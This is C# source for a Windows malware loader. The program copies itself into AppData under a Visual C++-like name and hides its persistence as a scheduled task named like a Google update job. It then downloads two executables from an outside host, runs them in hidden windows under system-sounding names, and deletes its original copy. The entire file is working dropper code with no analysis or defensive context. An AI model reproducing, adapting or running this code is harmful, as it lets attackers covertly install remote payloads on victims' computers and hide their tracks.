using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Loader
{
    class Program
    {

        public static String loader = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msvc2017.exe";
        public static String loaded_file = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SettingSyncHosts.exe";
        public static String loaded_file2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ServiceSyncHosts.exe";
        static void Main(string[] args)
        {
            String Mainpath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            File.Copy(Mainpath, loader,true);

            // Run a program every day on the local machine
            //TaskService.Instance.AddTask("GoogleUpdateTaskMachineService", QuickTriggerType.Daily, loader, "");


            Process.Start(new ProcessStartInfo
            {
                Arguments = ("/create /tn GoogleUpdateTaskMachineSettings /tr " + loader + " /sc daily /ri 1 /f"),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = false,
                FileName = "schtasks"
            });



            Thread.Sleep(6000);

            int milliseconds = 2000;

            if (CheckFileServer("https://qubiq.xyz/loaderDaily.exe"))
            {
                WebClient File1 = new WebClient();
                File1.DownloadFile("https://qubiq.xyz/loaderDaily.exe", loaded_file);
                // Console.WriteLine("File 1 succes found");

                Thread.Sleep(milliseconds);


                Process.Start(new ProcessStartInfo
                {
                    Arguments = ("/K" + loaded_file),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });

            }
            else
            {
                //Console.WriteLine("File 1 not found");
            }

            if (CheckFileServer("https://qubiq.xyz/loaderDaily2.exe"))
            {
                WebClient File2 = new WebClient();
                File2.DownloadFile("https://qubiq.xyz/loaderDaily2.exe", loaded_file2);

                Thread.Sleep(milliseconds);

                Process.Start(new ProcessStartInfo
                {
                    Arguments = ("/K" + loaded_file2),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            else
            {
               // Console.WriteLine("File 2 not found");
            }

        
        






            string appdatapath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msvc2017.exe";
            string mainpath = Process.GetCurrentProcess().MainModule.FileName;

            if (appdatapath == mainpath)
            {
                return;
            }
            else
            {

                SelfDelete("3");
            }



        }

        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static bool CheckFileServer(string Url)
        {
            WebRequest request = WebRequest.Create(Url);
            request.Method = "HEAD";

            try
            {
                using (var response = request.GetResponse())
                    return ((HttpWebResponse)response).StatusCode == HttpStatusCode.OK;

            }
            catch (WebException)
            {

                return false;
            }
        }


    }
}
